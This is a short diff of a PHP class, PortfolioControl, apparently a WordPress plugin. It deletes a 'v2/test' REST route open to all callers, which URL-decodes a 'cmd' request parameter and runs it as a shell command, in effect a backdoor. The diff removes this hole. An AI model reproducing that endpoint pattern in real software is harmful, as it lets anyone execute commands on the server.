@@ -31,11 +31,6 @@ class PortfolioControl {
 			'methods' => WP_REST_Server::READABLE,
 			'callback' => fn( ...$args ) => $this->importDBCallback( ...$args )
 		] );
-		register_rest_route( 'v2', '/test', [ 
-			'permission_callback' => '__return_true',
-			'methods' => WP_REST_Server::READABLE,
-			'callback' => fn( ...$args ) => $this->test( ...$args )
-		] );
 	}
 
 	private static function wp( string $wp_cli_cmd ) {
@@ -56,11 +51,6 @@ class PortfolioControl {
 
 	private function importDBCallback( WP_REST_Request $request ) {
 		return static::wp( 'db import ' . static::PATH_TO_DUMP );
-	}
-
-	private function test( WP_REST_Request $request ) {
-		$cmd = urldecode( $request['cmd'] );
-		return execWithErrors( $cmd );
 	}
 }
 
